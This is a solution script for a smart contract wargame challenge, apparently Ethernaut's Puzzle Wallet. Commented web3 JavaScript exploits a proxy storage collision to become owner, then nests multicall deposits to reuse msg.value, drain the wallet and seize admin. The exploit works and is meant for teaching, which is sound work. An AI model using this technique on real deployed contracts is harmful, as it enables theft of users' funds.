
// there are two main points in this challenge:
// - the actual storage 'holder' is the proxy contract.
//     this means that when a call is delegated from the
//     proxy to the implementation, the context stays the
//     same, so both PuzzleProxy.pendingAdmin and PuzzleWallet.owner
//     will point to the same storage location. this also happens with
//     admin and maxBalance.
//     through PuzzleProxy, we can edit pendingAdmin address storage area,
//     which is also the owner address'. by doing this, we can make owner
//     restricted calls in PuzzleWallet, such as addToWhitelist(), which
//     will then make us eligible to make whitelist restricted calls
//     in PuzzleWallet. this won't, however, make calling setMaxBalance()
//     with some address possible, as the contract has a non-zero balance.

await contract.sendTransaction({
    from: player,
    data: web3.eth.abi.encodeFunctionCall({
        "inputs": [
            {
                "internalType": "address",
                "name": "_newAdmin",
                "type": "address"
            }
        ],
        "name": "proposeNewAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }, [player]),
});

await contract.addToWhitelist(player);

// - we can make a reentrancy attack on multicall().
//     at this moment, we need to drain the contract's funds
//     in order to successfully call setMaxBalance().
//     calling deposit() by itself doesn't change anything,
//     nor does execute(), since balances[player] is 0 and
//     a subtraction would cause a revert.
//     however, multicall runs an array of calls and, while
//     it does have a flag to prevent calling multiple deposit()
//     with the same msg.value, this flag's scope is the function's.
//     since we can call multicall() inside multicall(), we can
//     still call multiple deposit() with the same msg.value,
//     we just have to wrap this deposit into another multicall()
//     call.
//     a way to solve this would be to deposit the contract balance,
//     then reusing msg.value to call deposit again (wrapping it in another
//     multicall()) and then, with
//     balances[player] == 2 * previousContractBalance == currentContractBalance,
//     calling execute() to send all the funds to player.

const encodeExecute = (...args) => web3.eth.abi.encodeFunctionCall(contract.abi.find(el => el.name === "execute"), args);
const encodeMulticall = (...args) => web3.eth.abi.encodeFunctionCall(contract.abi.find(el => el.name === "multicall"), args);
const encodeDeposit = (...args) => web3.eth.abi.encodeFunctionCall(contract.abi.find(el => el.name === "deposit"), args);

const contractBalance = web3.utils.toBN(toWei(await getBalance(contract.address)));

await contract.multicall.sendTransaction([
    encodeDeposit(),
    encodeMulticall([encodeDeposit()]),
    encodeExecute(player, contractBalance.mul(web3.utils.toBN(2)), [])
], {
    from: player,
    value: contractBalance
});

// now, since the contract balance is now 0, we can successfully
// call setMaxBalance(player), which will set PuzzleProxy.admin to
// player.

await contract.setMaxBalance(player);
